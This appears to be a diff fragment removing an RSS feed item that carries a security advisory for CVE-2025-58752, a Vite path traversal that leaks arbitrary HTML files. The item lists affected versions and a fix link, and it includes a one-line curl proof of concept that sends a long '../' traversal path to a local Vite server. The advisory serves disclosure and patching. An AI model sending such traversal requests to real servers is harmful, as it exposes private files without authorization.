-            <description><![CDATA[CVE-2025-58752, CRITICAL, Vite arbitrary remote HTML file leak]]></description>
-            <content:encoded><![CDATA[
-## Summary
-
-Vite arbitrary remote HTML file leak
-
-## Component
-
-[vite](https://www.npmjs.com/package/vite)
-
-## Affected versions
-
-\>=7.1.0,<=7.1.4
-
-\>=7.0.0,<=7.0.6
-
-\>=6.0.0,<=6.3.5
-
-<=5.4.19
-
-## Description
-
-This vulnerability allows a remote attacker to leak any HTML file on the system.
-
-## PoC
-
-Assuming a vite server is running on localhost, and `somefile.html` exists at the root directory
-
-```shell
-curl -v --path-as-is 'http://localhost:5173/../../../../../../../../../../../somefile.html'
-```
-
-## Vulnerability Mitigations
-
-No mitigations are supplied for this vulnerability 
-
-
-
-## References
-
-[Fix PR](https://github.com/vitejs/vite/pull/20736)
 ]]></content:encoded>
         </item>
         <item>
